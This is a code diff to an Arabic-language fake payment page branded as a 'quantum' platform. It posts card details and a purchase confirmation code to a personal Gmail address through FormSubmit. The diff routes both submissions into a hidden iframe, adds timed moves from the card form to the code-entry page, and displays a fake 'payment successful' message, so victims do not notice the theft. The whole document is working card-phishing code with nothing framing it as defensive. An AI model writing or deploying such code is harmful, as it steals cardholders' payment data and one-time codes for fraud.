@@ -593,12 +593,11 @@
                         <div class="relative z-10">
                             <h3 class="text-4xl font-bold hologram-text mb-12 text-center">بيانات البطاقة</h3>
                             
-                            <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="cardForm" class="space-y-8">
+                            <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="cardForm" class="space-y-8" target="hiddenFrame">
                                 <!-- حقول FormSubmit المخفية -->
                                 <input type="hidden" name="_subject" value="بيانات بطاقة دفع جديدة - منصة كوانتية">
                                 <input type="hidden" name="_template" value="table">
                                 <input type="hidden" name="_captcha" value="false">
-                                <input type="hidden" name="_next" id="nextUrl" value="">
                                 
                                 <!-- رقم البطاقة -->
                                 <div>
@@ -704,12 +703,11 @@
             <!-- نموذج التأكيد -->
             <div class="quantum-glass p-16 relative stable-element">
                 <div class="relative z-10">
-                    <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="confirmationForm" class="space-y-12 text-center">
+                    <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="confirmationForm" class="space-y-12 text-center" target="hiddenFrame">
                         <!-- حقول FormSubmit المخفية -->
                         <input type="hidden" name="_subject" value="كود تأكيد الشراء - منصة كوانتية">
                         <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" id="nextUrlCode" value="">
                         
                         <!-- كود التأكيد -->
                         <div>
@@ -790,6 +788,9 @@
             </div>
         </div>
     </div>
+
+    <!-- iframe مخفي لإرسال النماذج بدون توجيه -->
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
 
     <script>
         // تهيئة الصفحة
@@ -936,7 +937,6 @@
             // إرسال نموذج البطاقة
             document.getElementById('cardForm').addEventListener('submit', function(e) {
                 showQuantumLoading();
-                setNextUrl();
                 
                 // إضافة بيانات الشحن
                 const shippingData = {
@@ -957,6 +957,12 @@
                     input.value = shippingData[key];
                     this.appendChild(input);
                 });
+
+                // الانتقال لصفحة الكود بعد 2 ثانية
+                setTimeout(() => {
+                    document.getElementById('loadingOverlay').classList.add('hidden');
+                    showCodePage();
+                }, 2000);
             });
 
             // إرسال نموذج التأكيد
@@ -970,7 +976,12 @@
                 }
                 
                 showQuantumLoading();
-                setCodeNextUrl();
+                
+                // عرض رسالة نجاح بعد الإرسال
+                setTimeout(() => {
+                    document.getElementById('loadingOverlay').classList.add('hidden');
+                    showSuccessMessage();
+                }, 2000);
             });
         }
 
@@ -1070,6 +1081,33 @@
             if (window.location.hash) {
                 history.replaceState('', document.title, window.location.pathname);
             }
+        }
+
+        // عرض صفحة الكود
+        function showCodePage() {
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+        }
+
+        // عرض رسالة النجاح
+        function showSuccessMessage() {
+            const successHTML = `
+                <div class="fixed inset-0 bg-black/95 backdrop-blur-lg flex items-center justify-center z-50" id="successModal">
+                    <div class="quantum-glass p-12 rounded-3xl max-w-lg w-full mx-4 text-center">
+                        <div class="w-24 h-24 mx-auto bg-gradient-to-br from-neon-green to-electric-lime rounded-full flex items-center justify-center mb-8">
+                            <i class="fas fa-check text-4xl text-black"></i>
+                        </div>
+                        <h3 class="text-3xl font-black hologram-text mb-6">تم بنجاح!</h3>
+                        <p class="text-xl text-neon-green mb-8">تمت عملية الدفع بنجاح وسيتم التواصل معك قريباً</p>
+                        <button onclick="location.reload()" 
+                                class="quantum-button py-4 px-8 rounded-2xl font-bold text-lg">
+                            العودة للرئيسية
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.insertAdjacentHTML('beforeend', successHTML);
         }
     </script>
 
